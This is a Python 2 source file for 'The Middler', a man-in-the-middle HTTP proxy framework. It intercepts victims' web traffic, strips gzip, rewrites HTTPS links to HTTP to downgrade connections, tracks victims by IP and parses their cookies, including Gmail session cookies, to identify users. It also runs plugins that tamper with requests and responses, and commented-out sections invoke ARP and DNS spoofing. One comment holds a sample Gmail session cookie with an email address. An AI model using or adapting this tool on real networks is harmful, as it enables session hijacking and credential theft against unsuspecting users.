#!/usr/bin/env python

# Version 20090703

import libmiddler as ml
# Copyright 2009 Jay Beale
# Licensed under GPL v2

from httplib import *
from socket import *
import os, signal, SocketServer, select, sys, Cookie
import re, urllib,time
import threading, thread
from scapy import *

#### Globals

keep_gzip_in_requests = 0
port = 80

# Process ID's for any processes we fork
child_pids_to_shutdown = []
toggle_arpspoof = False

####################################################################################################
# Network interface code
####################################################################################################

#
# string &remove_ssl(text) takes a string and changes all of the https links into http links
#
def remove_ssl(text):
    """ remove_ssl(text) takes a chunk of text and changes all of the https links
    into http links, adding a pattern (currently /secure3 so as to place state
    in the link itself.

    We use this to allow Middler to identify requests that it should issue with
    SSL, while keeping the client side of the connection in straight HTTP.
    """

    # We want to change links that looks like this:
    #
    # https://host/foo
    #
    # to ones like this:
    #
    # http://host/secure3/foo
    #
    # We will then change any links they click on back to the original form
    # so that we talk to the servers through an encrypted connection and thus
    # have access to the pages we're loading.

    removessl_pat=re.compile(r"https://([^\\]+)(/.*)")
    newtext = removessl_pat.sub(r"http://\1/secure3\2",text)
    return newtext

#def parse_useragent(useragent):
    #pass        # DO SOMETHING HERE!?
    #return useragent


#
# Define both substring matches and regular expressions to match client
# request request_headers against.
#
prefix = {}
len_prefix = {}
prefix["host"] = "Host"
prefix["authorization"] = "Authorization"
prefix["useragent"] = "User-Agent"
prefix["cookie"] = "Cookie"
prefix["connection"] = "Connection"
prefix["proxyconnection"] = "Proxy-Connection"
prefix["acceptencoding"] = "Accept-Encoding"


# Pre-compute the lengths of the prefix (substring matches) to speed parsing.
# While we're at it, let's create a tuple of the keys here so we can
# change the line matching routine later to loop over the available
# prefixes more quickly.

client_header_prefixes = tuple(prefix.keys())

for item in client_header_prefixes:
    len_prefix[item] = len(prefix[item])

# Pre-compile regular expressions for client request_headers.
method_pat=re.compile(r"^(GET|POST|CONNECT) (.*) (HTTP\/\d.\d)")
blankline_pat=re.compile(r"^\s*\n\s*$")

# Special case - this is for putting back https on links
putbackssl_pat=re.compile(r"^/secure3(/.*)")

# Set up the patterns
statuscode_pat=re.compile(r"^HTTP\/\d\.\d (\d\d\d) (.*)")
contentlen_pat=re.compile(r"^Content-Length: (\d*)")
contenttype_pat=re.compile(r"^Content-Type: (.*)")
contentencoding_pat=re.compile(r"^Content-Encoding: (.*)")
setcookie_pat=re.compile(r"^Set-Cookie2?: (.*)")
location_pat=re.compile(r"^Location: (.*)")
connection_pat=re.compile(r"^Connection: (.*)")
out_of_header_pat=re.compile(r"^\n?")

#
# The Session class is for storing information about a given
# person/process that we learn while proxying one connection
# so as to use that information while handling other connections.
#
# Among other things, this is where we keep note of someone's username
# in an application.  When we get the GUI going, this is where we'll
# track what actions we've cued for their user on their next session.
#

class Sessions(dict):
    def getSession(self, source_ip):
        session = self.get(source_ip, None)
        if session == None:
            session = { 'source_ip' : source_ip }
            self[source_ip] = session
        return session

# Check sys.modules['middler']'s directory for a plugins/ directory.

PLUGINS = []
if (not PLUGINS or len(PLUGINS) == 0):

    ###### This code loads the fileparsers into the PLUGINS list
    parserdir = "%s%splugins"%(os.sep.join(sys.modules['libmiddler'].__file__.split(os.sep)[:-1]), os.sep)
    #parserdir = "%s%splugins"%(os.sep.join(sys.modules['libmiddler'].__file__.split(os.sep)[:-1]), os.sep) + "/enabled"
    ml.jjlog.debug(">>plugindir: %s<<"%parserdir)

    filename = None
    for filename in  os.listdir(parserdir):
        try:
        # Add any file in the active plugins directory that ends in .py and doesn't
        # start with _ to our list of plugins.

            if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
        #ml.jjlog.debug(">>Trying to load plugin from libmiddler.plugins.enabled.%s"%filename[:-3] )
                PLUGINS.append(__import__("libmiddler.plugins.%s"%filename[:-3], None, None, "libmiddler.plugins"))
        except:
            ml.jjlog.debug("Error loading plugin %s"%filename)
            x,y,z = sys.exc_info()
            sys.excepthook(x,y,z)
            pass

# If we haven't found the plugins/ directory yet, check the current directory
# for a plugins/ directory.

if (not PLUGINS or len(PLUGINS) == 0):

    ###### This code loads the fileparsers into the PLUGINS list
    #ml.jjlog.debug( os.path.abspath(os.curdir)
    parserdir = "./plugins"
    ml.jjlog.debug(">> Had to set plugin directory relative to current dir - plugindir: %s<<"%parserdir)
    filename = None
    try:
        for filename in  os.listdir(parserdir):
            try:
                if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
                    PLUGINS.append(__import__("libmiddler.plugins.%s"%filename[:-3], None, None, "libmiddler.plugins"))
            except:
                ml.jjlog.debug("Error loading plugin %s"%filename)
                x,y,z = sys.exc_info()
                sys.excepthook(x,y,z)
                pass
    except OSError:
        pass

###########################################################
# Networking code starts here.                                                        #
###########################################################

#
# Tell SocketServer.ThreadingTCPServer to release the ports
# it binds to more quickly upon exit.
#

class PluginSaysDontSend(Exception):
    def __init__(self, headers, data):
        self.headers = headers
        self.data = headers

#class MiddlerThreadTCPServer(SocketServer.ThreadingTCPServer):
#class MiddlerThreadTCPServer(SocketServer.TCPServer):
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    allow_reuse_address = True


#
# Set up the HTTP proxy - we'll have more protocols soon.
#

class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
#class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):

    # Set up a sessions() data structure for tracking information about
    # each target user, indexed by IP address.

    sessions = Sessions()

    def __init__(self, request, client_address, server):
        self.client_headers = {}
        self.current_user = MiddlerHTTPProxy.sessions.getSession(client_address)
        self.remove_ssl_from_response = 0
        #ml.jjlog.debug( (request, client_address, server, dir(self))
        SocketServer.StreamRequestHandler.__init__(self, request, client_address, server)

    ####################################################################################################
    # Request Parsing code - moving this out of Core code - plugins do this                                                        #
    ####################################################################################################

    # parse_any_post_params() - Parse the data in a POST request.
    def parse_any_post_params():
        """Parse the data in a POST request."""

        # Now let's parse the rest of the request if any exists.

        while line == "":
            line = self.rfile.readline()
            #ml.jjlog.debug(line)

            #ml.jjlog.debug(line,0)
            if client_headers["method"] == "POST":
                #ml.jjlog.debug("We have a post - TODO: parse the params!\n")
                if re.match("&",line):
                    params = line.split("&")
                    for param in params:
                        if re.match("=",param):
                            (variable,value) = param.split("=")
                            #ml.jjlog.debug("POST data: %s=%s" % (variable,value))
                        else:
                            ml.jjlog.debug("POST data: %s" % param)
                else:
                    ml.jjlog.debug("POST data: %s" % line)

            modified_request = modified_request + line
        # end while line == "":


    def parse_useragent(self, user_agent):
        current_user = {}
        client_headers = {}

        if not current_user.has_key("UserAgent"):

            client_headers["user_agent"]=user_agent
            current_user["UserAgent"]=user_agent
            # Now parse out the specific browser
            firefox_pat=re.compile(r".*Firefox/(\d+\.\d+\.\d+).*")
            iphone_safari_pat=re.compile(r"Mozilla/(\d+\.\d+) \(iPhone; U; CPU iPhone OS (\d+_\d+) like Mac OS X\;\s*\w+-\w+.*\) AppleWebKit/([\d\.]+)    \(KHTML, like Gecko\) Version/([\d\.]+) Mobile/(\w+) Safari/([\d\.]+)")

            # TODO: grab browser user agent strings from InGuardians.com web server...

            if firefox_pat.match(user_agent):
                # Example of catching Firefox in use:
                # Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
                browser_type="Firefox"
                browser_version_set=firefox_pat.match(user_agent).groups()
                browser_version=browser_version_set[0]
                current_user["browser_type"] = browser_type
                current_user["browser_version"] = browser_version
             # print "Found that user has Firefox version",browser_version,"\n"
            elif iphone_safari_pat.match(user_agent):
                # Example of catching iPhone in use:
                #
                # User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X;
                # en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1
                # Mobile/5A347 Safari/525.20
                browser_type="iPhone Safari"
                browser_version_set=iphone_safari_pat.match(user_agent).groups()
                browser_version=browser_version_set[4]
                current_user["browser_type"] = browser_type
                current_user["browser_version"] = browser_version
                # TODO: Figure out which version changes the most or is used in OSVDB for tracking
                #print "Found that user has iPhone Safari version",browser_version,"\n"
            #elif apple_pub_sub.match(useragent):
            #    User-Agent: Apple-PubSub/65.1.1

            # User-Agent: KNewsTicker v0.2
            # User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20

            #else:
                #ml.jjlog.debug ("UserAgent string we cannot yet parse:" + user_agent,"\n")
        return current_user



    # parse_cookies(raw_cookie_line) - Parse any Cookie: lines in the request.
    def parse_cookies(self, raw_cookie_line):
        """Parse any Cookie: lines in the request."""

        # Parsing a string like this:
        #
        # #            Cookie: GMAIL_AT=xn3j31q5q8ylqcg13fyw9gchigyi6d; gmailchat=jay.beale@gmail.com/804066; S=payments=WTqZcq5
        #L9bU:static_files=HxA60P1YyYE:gmail=-zkMnu97hlGeg7NNu7tXGQ:gmail_yj=Qr78OzTSgECwGI1QDvbIfQ:gmproxy=WPfKvb
        #C3a4Q:gmproxy_yj=Ar5Trs-pYMw:gmproxy_yj_sub=KcLOAEX1F4g;
        cookie={}
        raw_cookies=raw_cookie_line.split(r"; ")
        for raw_cookie in raw_cookies:
            # We want the opposite of this:     urllib.urlencode()
            unescaped_cookie=urllib.unquote(raw_cookie)
            #ml.jjlog.debug("Found client trying to send cookie: " + raw_cookie + " decoded version : " + unescaped_cookie)
            #ml.jjlog.debug("Found client trying to send cookie: " + raw_cookie + " decoded version : " + unescaped_cookie)

            equal_pos=unescaped_cookie.index('=')
            # Separate unescaped_cookie into two pieces name= and value
            cookie_name=unescaped_cookie[0:equal_pos]
            cookie_value= unescaped_cookie[equal_pos+1:]
            # BUG/TODO: the previous line might need -1 added to end.
            #ml.jjlog.debug("Found cookie name was " + cookie_name)
            #ml.jjlog.debug("Found cookie value was " + cookie_value)

            # Now remove the equal from name=
            #cookie_name.slice!(-1,1)
            cookie[cookie_name]=cookie_value

            # Let's display this cookie.    But first, let's go a step further if the cookie value contains = signs.
            #
            # Looking to parse a cookie that looks like this:
            #
            # ID=949e33deacfe6ad9:FF=4:LR=lang_en:LD=en:NR=10:TM=1175614973:LM=1210206169:FV=2:GM=1:IG=3:GC=1:S=0uWPvrTxO6BrbAUR;

            has_embedded_cookies_pat = re.compile(r"^([^=]+)=([^:=]+):")
            if has_embedded_cookies_pat.match(cookie_value):
                #ml.jjlog.debug("Found that cookie " + cookie_name + " has embedded cookies inside.")
                # Let's split this intro strings like this:
                #
                # ID=949e33deacfe6ad9:
                # FF=4

                embedded_cookies = cookie_value.split(":")
                for embedded_cookie in embedded_cookies:
                    (name,value) = embedded_cookie.split("=")
                    #ml.jjlog.debug("Embedded cookie name " + name + " has value " + value)

                #items = embedded_cookies.match(cookie_value).groups()
                #ml.jjlog.debug("Embedded cookie 1: " + items[0] + " = " + items[1] + "\n")

            else:
                pass
                #ml.jjlog.debug("Cookie " + cookie_name + " had value " + cookie_value)

            # check this for Google ID
            # Parse a line like this:
            # gmailchat=jay.beale@gmail.com/839199;

            if cookie_name == "gmailchat":
                developerlog("Current session is user %s\n" % cookie_value)


    ####################################################################################################
    # Plugin Architecture functions are found here - very important to understand                                            #
    ####################################################################################################

    # This function runs through all plugins that have subscribed, passing each
    # the request headers and data, receiving both back, possibly modified along
    # with notification as to whether the plugin changed anything and if the
    # plugin requires that no other plugin receive a chance to make changes
    # before we hand the data back to the user.

    def doRequest(self, session, request_headers, data):
        global PLUGINS
        for plugin in PLUGINS:
            try:
                ml.jjlog.debug("executing plugin %s" % plugin)
                request_headers, data, changed, stop = plugin.doRequest(session, request_headers, data)
                if stop:
                    break
            except PluginSaysDontSend, e:
                raise e
            except Exception, msg:
                print "ERROR in plugin %s: %s"%(repr(plugin), repr(msg))
        return (session, request_headers, data)

    # This function runs through all plugins that have subscribed, passing each
    # the response headers and data, receiving both back, possibly modified along
    # with notification as to whether the plugin changed anything and if the
    # plugin requires that no other plugin receive a chance to make changes
    # before we hand the data back to the user.    This function also gives each
    # plugin a copy of the request headers, allowing the plugins to know what
    # contributed to this response.    In particular, the request's method/URL are
    # likely very critical here.

    # TODO-Med: Figure out if we should be handing the request data (like POST
    # data) to the plugins.

    def doResponse(self, session, request_headers, response_headers, data):
        global PLUGINS
        for plugin in PLUGINS:
            try:
                response_headers, data, changed, stop = plugin.doResponse(session, request_headers, response_headers, data)
                if stop:
                    break
            except PluginSaysDontSend, e:
                raise e
            except Exception, msg:
                print "ERROR in plugin %s: %s"%(repr(plugin), repr(msg))
        ml.jjlog.debug("returning from doResponse")
        return (session, response_headers, data)


    ####################################################################################################
    # Main handler functions
    ####################################################################################################

    # handle() - handles one client connection intended for a web server.
    def handle(self):
        """Handles one client connection intended for a web server."""

        # close_request: tracks whether the browser has asked to close the
        # connection when we're done servicing this request.
        #print self
        close_requested=0

        while close_requested == 0:
            ml.jjlog.debug("Started a new thread to handle connection from %s!" % self.client_address[0])

            #test_header = "HTTP/1.1 200 OK" + "Date: Sat, 09 Aug 2008 09:44:35 GMT" + "Server: Apache/1.3.41 (Unix) mod_perl/1.31-rc4" + "Connection: close" + "Content-Type: text/html; charset=iso-8859-1" + "\n\nfoo\n"

            desthostname = "" # var: desthostname stores the server name we're trying to contact.
            modified_request = "" # var: modified_request stores the modified request, which is the same as the real request except when we make a change.
            ## var: client_headers{} stores relevant header values, to take effort off plug-in authors.
            #client_headers =    {}

            #
            # Store variables about things we want to modify:
            #


            inject_status_code = 0    # var: inject_status_code - should we inject a new status code on next request?

            # Status code message we'd like to inject, like:
            #
            # HTTP/1.1 307 Temporary Redirect
            # ...
            # with location field:
            #
            # Location: http://mail.google.com/mail/

            status_code_to_inject = ""

            # Location we'd like to inject, with 301 (permanent) or 307 (temporary)
            #location_to_inject = ""


            # Content-Length handling - if we modify POST data, we need to recalculate the content length.
            # var: recalculate_content_length - Track whether we need to recalculate the content length.
            # TODO: Should we track the current content_length offset with each change?
            recalculate_content_length = 0
            suppress_content_length = 1


            # var: need_to_do_this_over_ssl keeps track of whether we're proxying a
            # request to a link that we previously converted from https:// to http://.
            need_to_do_this_over_ssl=0

            ###########################################################################
            # Parse HTTP request headers
            ###########################################################################

            # Start by parsing the client headers until we hit a blank line signaling
            # that those headers are over.

            # TODO-Low: move the header line-specific code here into anonymous
            #                     routines, referenced by a hash like the prefix{} and
            #                     len_prefix{} hashes.

            # TODO-Med: remove the repeated modified_request concat lines, replacing
            #                     with logic that simply does this unless the routine would
            #                     not have.    If it would not have, let's have it just blank the
            #                     line.

            #print("self.rfile is the following kind of object %s\n" % str(type(self.rfile)) )
            try:
                line = self.rfile.readline()
                #sys.stdout.write(line)
                #sys.stdout.write(r"\r\n")
            except:
                print "ERROR: first readline() on the request failed!\n"

            request_headers = [ ("Request",line) ]

            try:
                while True:
                    line = self.rfile.readline()
                    if line in ("\r\n" ,"\n"):
                        break
                    header, value = line.split(": ",1)
                    request_headers.append((header,value))
                #sys.stdout.write(line)
            #print "done reading request_headers!"
            except:
                ml.jjlog.debug("Probably just finished reading request header")

            #### Handle Header-analysis
            method, part2 = request_headers[0][1].split(' ',1)
            url, HTTPprotocol = part2.rsplit(' ',1)
            if method == "CONNECT":
                #ml.jjlog.debug("Found a CONNECT method.    Changing to GET.\n")
                method = "GET"
                # TODO-Low: Parse CONNECT methods better so we allow people to use
                # this as a positive proxy.

            if self.remove_ssl_from_response == 1:
                # Check to see if we need to put the SSL back!
                if putbackssl_pat.match(url):
                    # Make sure we do an SSL connection when we connect to the server
                    need_to_do_this_over_ssl=1
                    # Now change the URL back, removing /secure3
                    url=putbackssl_pat.match(url).groups()[0]
                    # We put the changed URL in the request we'll send to the server
                    header[0] = " ".join((method, url, HTTPprotocol)) + "\n"

            # Now for the rest of the request_headers (the official ones)
            length = len(request_headers)
            index = 1
            while index < length:
                #print index
                #print request_headers[index]
                header, value = request_headers[index]
                if header == prefix["host"]:
                    desthostname = value.strip()
                    #modified_request = modified_request + line

                ### TODO-Med: put this in a module!
                ##elif header == prefix["authorization"]:
                    ##username, password = decode64(line[len_prefix["authorization"]:])
                    ##client_headers["auth_basic_username"] = username
                    ##client_headers["auth_basic_password"] = password
                    ###modified_request = modified_request + line

                #elif method_pat.match(line):
                    #(method,url,HTTPprotocol) = method_pat.match(line).groups()
                    #if re.compile(r"^CONNECT").match(method):
                        #ml.jjlog.debug("Found a CONNECT method.    Changing to GET.\n")
                        #method = "GET"
                        #re.sub(r"^CONNECT","GET",line)

                    # Store the URL, method and HTTPprotocol in their possibly-modified form
                    #self.client_request_url = url
                    #self.client_headers["request_method"]=method
                    #self.client_headers["request_version"]=version

                #elif header == prefix["useragent"]:
                    ## Unless we already have this user's UserAgent string, let's log and parse it.
                    #if not "User Agent" in self.current_user:
                        #useragent = value

                        #self.client_headers["user_agent"]=useragent
                        ## TODO: add a set of return values that tell us what browser/useragent we have, what version, what operating system, os version, and hardware architecturee
                        #self.parse_useragent(useragent)
                    #modified_request = modified_request + line

                #elif header == prefix["cookie"]:
                        #c = Cookie.SimpleCookie()
                        #cookies=line[len_prefix["cookie"]:]
                        #c.load(cookies)
                        #client_headers['cookies'] = c
                        ##client_headers["cookies"] = self.parse_cookies(cookies)
                        ## Unless we want to tamper with or remove cookies, just do this:
                        ##modified_request = modified_request + line
                elif header == prefix["connection"]:
                    connection = value
                    self.client_headers["connection"] = connection
                    if connection == "Close":
                        close_requested = 1
                            #ml.jjlog.debug("Encountered a Connection: close from browser - it doesn't want keepalive.")

                elif header == prefix["proxyconnection"]:
                    proxyconnection = value

                    self.client_headers["proxyconnection"] = proxyconnection
                    if proxyconnection.strip().lower() != "keep-alive":
                        #ml.jjlog.debug("Encountered a Proxy-Connection: from browser - should we take the client through that proxy?\n")
                        #ml.jjlog.debug("Proxy-Connection value was %s.\n" % proxyconnection)
                        ml.jjlog.debug("Debug: stripping out a Proxy-Connection - are you sure you're not pointing your browser at this intentionally?")

                        # Strip this line out so we don't tell the server we're using a proxy.
                        #
                        # So the following line is commented out.
                        # modified_request = modified_request + line

                elif header == prefix["acceptencoding"]:
                    acceptencoding = value
                    #self.client_headers["acceptencoding"] = acceptencoding
                    # TODO: Make this a user option

                    # Remove any acceptance of gzip encoding.
                    if not keep_gzip_in_requests:
                        request_headers.pop(index)
                        length -= 1
                    #modified_request = modified_request + line
                #elif blankline_pat.match(line):
                    ## Stop processing if we hit the blank space at the end of the request_headers.
                    ##modified_request = modified_request + line
                    #break
                ##else:
                    ## If we haven't matched any of these patterns, but we're still in the
                    ## request headers, just add this line to the replacement request.
                    ##modified_request = modified_request + line
                index += 1

            port = 80
            ml.jjlog.debug("%s is requesting %s:%s" % (self.client_address[0], desthostname, port))

            try:
                if method == "POST":
                    request_data = self.rfile.readline()
                    #ml.jjlog.debug("done reading POST data: \n%s"%request_data)
                else:
                    request_data = ""
                    #ml.jjlog.debug("done reading data! ")
            finally:
                self.rfile.close()

            self.current_user, request_headers, request_data = self.doRequest(self.current_user, request_headers, request_data)
            ml.jjlog.debug("returned from doRequest")

            ###########################################################################
            # Send request and parse HTTP response headers
            ###########################################################################

            #response_to_send_to_client=""
            #server_headers = {}
            response=""
            modified_headers = []

            # Open a connection to the desired server and send request

            try:
                port = 80
                ml.jjlog.debug("Connecting HTTP to: %s:%d\n" % (desthostname,port))
                j=HTTPConnection("%s:%d" % (desthostname,port) )
                j.putrequest(method,url,"skip_host")
                #print "\n=========\nRequest going out:\n"
                #print("Request as follows: %s %s\n" % (method,url))
    # Switch in the original headers.

                for header in request_headers[1:]:
                    lvalue = header[0]
                    lvalue = lvalue.capitalize()
                    rvalue = header[1]
                    #print ("%s: %s" % (lvalue,rvalue[0:-1]) )
                    j.putheader(lvalue,rvalue[0:-1])
                    #print "Just inserted header %s: %s" % ( header[0],rvalue[0:-1])

                j.endheaders()
                j.send(request_data)
                #if request_data:
                #  print ("\n%s\n" % request_data )

    # Now get a response and take the parsing for free!
                response_object=j.getresponse()

            except:
                ml.jjlog.debug("Connection failed to host %s\n" % desthostname)
                break

                #ml.jjlog.debug("Just sent modified request: \n%s" % modified_request)
                #ml.jjlog.debug("Just sent modified request:\n%s" % modified_request)

                # Now get data from the server
    # Turn the socket into a file thing.

            # Parse the response
            modified_response=""

            # Now parse one line at a time
            content_type_is_image = 0

            http_version = "HTTP/%s.%s" % (str(response_object.version)[0],str(response_object.version)[1])
            response_code_line = "%s %s %s" % (http_version,str(response_object.status),str(response_object.reason))
            #print ("Got response code %s\n" % response_object.status)
            #print ("Response code line is %s\n" % response_code_line)
            ml.jjlog.debug("response_code_line is %s" % response_code_line)

            # We've set an initial value - overwrite this if necessary.
            #if inject_redirect(desthostname) == 1:
            #    response_headers = [ ( "Response", "HTTP/1.1 307 Temporary Redirect\n" + "Location: " + location_to_inject + "\n" ) ]
            #elif inject_status_code == 1:
            #    response_headers = [ ( "Response", status_code_to_inject ) ]
            #else:
            #     #Let's put the response code on top!
            #    response_headers = [ "Response",response_code_line ]


            # Let's put the response code on top, allowing the plugins to see and modify
            # the response code.

            response_headers = []
            response_headers.append( ["Response",response_code_line] )

            # Now add on the rest of the response headers.
            unordered_headers = response_object.getheaders()
            for header_idx in xrange(1, len(unordered_headers)):
                try:
                    hdr = unordered_headers[header_idx]
                    #print repr(hdr)
                    header, value = hdr
                    response_headers.append([header.capitalize(),value])
                except:
                    print "Header parsing failing.\n"

            # And store the data in the page.
            response_data = response_object.read()

            # Temporary code for seeing if the difference in sites is the ret characters
            firstret = response_data.find('\n')
            if firstret >= 0 :
                if response_data[firstret-1] == '\r':
                    print ("For site %s, newlines included \\r!\n" % desthostname)
                    ml.jjlog.debug("For site %s, newlines included \\r!" % desthostname)

            ml.jjlog.debug("\nbefore plugin, response headers are %s\n\n" % response_headers)
            self.current_user, response_headers, response_data = self.doResponse(self.current_user, request_headers, response_headers, response_data)
            ml.jjlog.debug("after plugins, response headers are %s\n\n" % response_headers )

            #    GREAT! Now let's build our reply.    TODO-med: Make SSL changes happen prior to this.
            # Caught the bug!!!!
            #
            # modified_response_temp was built without adding the rets to the first line!!!!

            rets = "\n"
            #response_code_line = ( "%s%s" % (response_headers[0][1] , rets) )
            modified_response_temp = []

            # Remove the first item from response_headers, since it's our Response Code and reason
            # psuedo-header.  We can make this the first line, but it needs to have only the rvalue.
            modified_response_temp.append(response_headers.pop(0)[1])

            for header_idx in xrange(1,len(response_headers)):
                modified_response_temp.append("%s: %s%s"% (response_headers[header_idx][0],response_headers[header_idx][1],rets))
            modified_response_temp.append(rets)     #rets is the *identified* bytes used as CRLF
            modified_response_temp.append(response_data)
            modified_response = "".join(modified_response_temp)

#            print "\n=====\nmodified_response is %s\n=========\n" % modified_response

            # If we're removing ssl, do this to the entire modified_response at once, so
            # we catch links that span multiple lines or where there are more than one
            # per line
            # TODO - put this back

            if self.remove_ssl_from_response == 1:
                modified_response = remove_ssl(modified_response)
                # TODO: Log the URL and source IP that we're changing to non-SSL so we can
                # keep track of this without the stupid kludge

            # Send the response back to the client
            #ml.jjlog.debug("Preparing to send modified response to client: %s" % modified_response)
            try:
                self.wfile.write(modified_response)
                self.wfile.flush()

                ##### TODO-high: This is experimental... remove if it breaks stuff.
                close_requested = 1
                self.wfile.close()
            except:
                self.wfile.close()
                #self.wfile.close()
                #self.rfile.close()

        # while loop ends here - this happens whenever a client

        # What happens to performance if we don't close out our connections with the clients and servers?
        #
        #server.close()
        #self.wfile.close()
        #self.rfile.close()

    # Complete the connection.
    def finish(self):
        # Just in case we forgot to close off the sockets?
        # Let's see if we get errors.
        #ml.jjlog.debug("Made it into SocketServer.finish!\n")

        self.wfile.close()
        self.rfile.close()





class InjectRedirect:
    """This class is just here to allow us to track the state of a global variable that we'll soon be turning into real application logic."""

    def __init__(self):
        self.inject_redirect_stub = 0

    def inject_redirect(self,hostname):
        # This is really a stub routine right now, which will contain logic to decide whether to
        # inject a redirect on the next request by this user to this host.

        # For now, let's just check a class variable

        return self.inject_redirect_stub

    def set_inject_redirect(self,value):
        # This is really a stub routine right now, which will contain logic to decide whether to
        # inject a redirect on the next request by this user to this host.

        # For now, let's just set the class variable
        self.inject_redirect_stub = value



######################################
#### Main non-class Code starts here.
######################################


#### First, parse out command-line options

###if __name__ == '__main__':


    #################################
    #### Parse command-line options #
    #################################

    ###(options,args)=parseCommandLineFlags()

    ###hostname = options.ip
    ###port = int(options.port)

    #### Will we be removing SSL from the response?
    ###remove_ssl_from_response = 0
    ###if options.sslstrip:
        ###remove_ssl_from_response = 1

    #### Will we be injecting redirects?
    ###IR = InjectRedirect()
    #### Location we'd like to inject, with 301 (permanent) or 307 (temporary)
    ###location_to_inject = ""
    ###if options.url != "":
        ###location_to_inject = options.url
        ###IR.set_inject_redirect(1)
        ###if not re.match(r"^http",location_to_inject):
            ###print "website_to_redirect_users_to must start with http:// or https://\n"
            ###sys.exit(1)



    ######################
    #### Signal handling #
    ######################

    #### Define a signal handler so we can make sure we close the log files.
    ###def handle_signal_term(signum,frame):


        #### Kill off any children we've left around, generally from ARP spoofing.
        ###for pid in child_pids_to_shutdown:
            ###kill(pid,9)

        #### TODO-High: cleanly deactivate ARP spoofing

        #### Deactivate any ARP spoofing
        #### deactivate_arpspoof()


        #### Turn off the firewalling/routing
        ####stopRedirection()

        #### Close up the log files.
        ####ml.jjlog.debug("Closing log files.\n")
        ###stop_logging()
        ###exit(0)


    #### Catch normal kill command
    ###signal.signal(signal.SIGTERM, handle_signal_term)
    #### Catch Ctrl-C
    ###signal.signal(signal.SIGINT, handle_signal_term)

    #### Initialize Logging - open files for writing and create thread locks.
    ###initialize_logging()

    #### Start up the firewalling and routing to    send traffic to us.
    # startRedirection()

    #### Activate the DNS spoofing?
    ####os.spawnl(os.P_NOWAIT,r"/Users/jay/BFF_DNS.pl","")

    ####
    #### Activate the ARP spoofing.
    ####

    ####
    #### The middle_the_net module contains functions to target and MitM the LAN
    ####
    #### First, define what interfaces we need to ARPspoof.
    ####
    ###if toggle_arpspoof:
        #### TODO: Come back and get the interface list from command line and GUI
        ###victim_interface_list = [ "en0", "en1"]

        #### Now, launch a thread/process to ARPspoof the network.
        #### We wrote this as a thread, but we might write it as a process later.
        #### Doing the latter requires working with shared memory and command channels.
        ###arpspoof(victim_interface_list)

    #### Start up the multi-threaded proxy
    ####ml.jjlog.debug("Activating proxy\n")
    ###server = MiddlerThreadTCPServer((hostname,port), MiddlerHTTPProxy)

    ###server.serve_forever()

    #### We shouldn't ever reach this line, since the signal handler should do this.
    ###stop_logging()

####    Commands in scapy we can use:
####user_commands = [ sr, sr1, srp, srp1, srloop, srploop, sniff, p0f, arpcachepoison, send, sendp, traceroute, arping, ls, lsc, queso, nmap_fp, report_ports, dyndns_add, dyndns_del, is_promisc, promiscping ]
